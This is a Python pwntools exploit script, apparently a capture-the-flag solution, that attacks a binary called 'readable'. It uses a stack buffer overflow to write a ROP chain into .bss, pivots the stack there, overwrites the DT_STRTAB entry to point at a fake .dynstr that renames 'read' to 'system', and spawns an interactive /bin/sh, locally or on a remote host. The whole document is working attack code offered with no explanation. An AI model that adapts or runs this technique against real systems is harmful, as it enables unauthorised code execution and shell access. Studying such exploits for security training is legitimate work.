from pwn import *

g_fname = args.FNAME if (args.FNAME) else "./readable"
g_elf = ELF(g_fname)
g_libcname = args.LIB if (args.LIB) else "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
g_libc = ELF(g_libcname)

context.binary = g_elf

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.RHOST.split(':')
	g_io = remote(h, p)

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def write2addr(addr, payload):
	bof_padding = 'a'*0x10
	addr_read = 0x400505
	rbp = 0x600890
	for i in range(0, len(payload), 0x10):
		cur_pld = flat([
			bof_padding, addr + 0x10, addr_read,
			payload[i:i+0x10].ljust(16, b'\0'), rbp, addr_read
		])
		addr += 0x10
		g_io.send(cur_pld)

def rop2read(buf, cnt):
	got_read = g_elf.got["read"]
	csu_front = 0x400570 # mov %r13, %rdx; mov %r14, %rsi; mov %r15d, %edi; callq *(%r12, %rbx, 8)
	csu_end = 0x40058a # pop %rbx; pop %rbp; pop %r12~15; ret
	payload = flat([
		csu_end,
		0, 1, # rbx, rbp
		got_read, # r12
		cnt, # r13->rdx
		buf, # r14->rsi
		0, # r15->edi
		csu_front,
		7*p64(0)
	])
	return payload
	
def pwn():
	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"read", b"system")
	log.debug("fake_dynstr:\n\tlength=%d\n\tcontent:%s", len(fake_dynstr), fake_dynstr)

	binsh_str = b"/bin/sh\0"
	data2write = binsh_str+ fake_dynstr 
	log.debug("data2write:\n\tlength=%d\n\tcontent:%s", len(data2write), data2write)

	dynamic_shaddr = g_elf.get_section_by_name(".dynamic")["sh_addr"]
	addr_dt_strtab_val = dynamic_shaddr + 8*0x10 + 8
	log.debug(".dynamic's sh_addr=%#x\n\tElf64_Dyn of DT_STRTAB@%#x", dynamic_shaddr, addr_dt_strtab_val)

	plt_read = g_elf.plt["read"] + 6 # pushq $0x0, jmpq 4003d0

	p_rdi = 0x400593
	rop = rop2read(addr_dt_strtab_val, 8)
	rop_be_replaced = flat([
		p_rdi, 0xdeadbeef, # 0xdeadbeef is the placeholder of binsh_addr
		# align stack with 0x10 for xmm0 instructions.
		0x400590, "alignStack".ljust(16), 
		plt_read
	]) # 0xdeadbeef is the placehold of binsh_addr
	log.debug("rop lenght=%#x", len(rop))

	bss_addr = g_elf.bss()
	new_stack = (bss_addr + 0x500 + 15) & (2**64 - 16)
	data_addr = (new_stack + len(rop) + len(rop_be_replaced) + 15) & (2**64 - 16)
	binsh_addr = data_addr
	rop += flat([
		p_rdi, binsh_addr, # 0xdeadbeef is the placeholder of binsh_addr
		# align stack with 0x10 for xmm0 instructions.
		0x400590, "alignStack".ljust(16), 
		plt_read
	])

	# update 
	log.debug(".bss@%#x\n\tdata_addr=%#x\n\tbinsh_addr=%#x\n\tnew_stack=%#x"
		, bss_addr
		, data_addr
		, binsh_addr
		, new_stack
	)
	getpid()

	write2addr(new_stack, rop)
	write2addr(data_addr, data2write)

	# migrate to new_stack
	leave_ret = 0x400520 # leave; ret
	g_io.send(flat(['a'*0x10, new_stack - 8, leave_ret]))

	g_io.send(p64(data_addr + len(binsh_str)))

if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "deubg"
	pwn()
	g_io.interactive()
